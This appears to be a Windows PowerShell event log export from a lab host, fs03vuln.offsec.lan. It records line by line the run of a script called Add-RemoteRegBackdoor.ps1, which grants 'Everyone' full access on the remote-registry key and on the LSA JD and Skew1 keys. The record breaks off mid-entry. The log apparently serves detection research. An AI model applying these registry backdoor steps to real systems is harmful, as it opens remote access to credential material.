<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54705</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>        Write-Verbose "[$Computer : $Key] Using trustee username '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1013

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=        Write-Verbose "[$Computer : $Key] Using trustee username '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : ] Using trustee username 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54706</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" @WmiArguments
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1015

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" @WmiArguments
</Data>
      <Data>CommandInvocation(Get-WmiObject): "Get-WmiObject"
ParameterBinding(Get-WmiObject): name="Class"; value="Win32_Service"
ParameterBinding(Get-WmiObject): name="Filter"; value="name='RemoteRegistry'"
ParameterBinding(Get-WmiObject): name="ComputerName"; value="FS03"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54707</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer] Attaching to remote registry through StdRegProv"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1017

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer] Attaching to remote registry through StdRegProv"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03] Attaching to remote registry through StdRegProv"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54708</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter "__CLASS = 'StdRegProv'" @WmiArguments
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1019

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter "__CLASS = 'StdRegProv'" @WmiArguments
</Data>
      <Data>CommandInvocation(Get-WmiObject): "Get-WmiObject"
ParameterBinding(Get-WmiObject): name="Namespace"; value="root/default"
ParameterBinding(Get-WmiObject): name="Class"; value="Meta_Class"
ParameterBinding(Get-WmiObject): name="Filter"; value="__CLASS = 'StdRegProv'"
ParameterBinding(Get-WmiObject): name="ComputerName"; value="FS03"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54709</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1021

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54710</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1023

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54711</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1025

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54712</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1027

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating the trustee WMI object with user 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54713</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1029

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Trustee"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54714</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1031

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Applying Trustee to new Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54715</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1033

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54716</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1035

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring completed for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54717</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1037

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring started for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54718</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1039

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54719</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1041

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54720</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1043

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating the trustee WMI object with user 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54721</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1045

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Trustee"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54722</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1047

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Applying Trustee to new Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54723</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1049

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54724</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1051

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring completed for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54725</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1053

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring started for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54726</EventRecordID>
      <Channel>Windows PowerShell</Channel>
